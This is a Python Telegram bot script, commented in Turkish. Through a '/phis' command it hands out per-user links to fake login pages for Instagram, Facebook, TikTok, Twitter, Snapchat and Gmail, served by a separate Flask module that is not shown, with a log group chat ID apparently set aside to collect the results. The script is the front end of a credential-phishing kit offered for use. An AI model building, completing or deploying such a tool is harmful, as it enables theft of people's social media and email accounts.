import telebot
import time
from telebot import types

# Bot token'ınızı buraya yazın
BOT_TOKEN = '1234567890:qwertyuıoğüğpoıuytrewasdfghjklşiiqwertyuıopğü'
bot = telebot.TeleBot(BOT_TOKEN)


user_states = {}


@bot.message_handler(commands=['phis', 'start'])
def phis_command(message):
    if message.chat.type != "private":
        bot.reply_to(
            message,
            "❌ Bu komut yalnızca özel sohbetlerde kullanılabilir. Lütfen bana doğrudan mesaj gönderin."
        )
        return

    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard.add("Instagram 📸", "Facebook 👍", "TikTok 🎵")
    keyboard.add("Twitter 🐦", "Snapchat 👻", "Gmail 📧")
    keyboard.add("Geri ↩️")  
    

    bot.send_message(
        message.chat.id,
        "Hangi platformdan giriş yapmak istiyorsunuz?",
        reply_markup=keyboard
    )

    user_states[message.chat.id] = "waiting_for_selection"


@bot.message_handler(func=lambda message: message.text in ["Instagram 📸", "Facebook 👍", "TikTok 🎵", "Twitter 🐦", "Snapchat 👻", "Gmail 📧", "Geri ↩️"])
def handle_buttons(message):
    if message.chat.id not in user_states:

        bot.send_message(message.chat.id, "Lütfen önce /phis komutunu kullanın.")
        return
    
    if message.text == "Geri ↩️":
     
        bot.send_message(
            message.chat.id,
            "Seçim iptal edildi. Tekrar platform seçmek için /phis komutunu yazabilirsiniz.",
            reply_markup=types.ReplyKeyboardRemove()
        )

        user_states.pop(message.chat.id, None)
    else:
        # flesk modülünü çalıştırdığınız bağlantıyı braya ekleyin bir domaine bağlamanız tavsiye edilir
        base_url = "https://domaınınızıburayaekleyın/login/"
        platform_links = {
            "Instagram 📸": f"{base_url}instagram/{message.chat.id}",
            "Facebook 👍": f"{base_url}facebook/{message.chat.id}",
            "TikTok 🎵": f"{base_url}tiktok/{message.chat.id}",
            "Twitter 🐦": f"{base_url}twitter/{message.chat.id}",
            "Snapchat 👻": f"{base_url}snapchat/{message.chat.id}",
            "Gmail 📧": f"{base_url}gmail/{message.chat.id}",
        }
        selected_link = platform_links[message.text]

        bot.send_message(
            message.chat.id,
            f"Platform linkiniz: {selected_link}\n\nLinki."
        )


if __name__ == '__main__':
    print("Bot başlatılıyor...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            print(f"Hata oluştu: {e}")
            time.sleep(5)


LOG_GROUP_CHAT_ID = -1002033390647


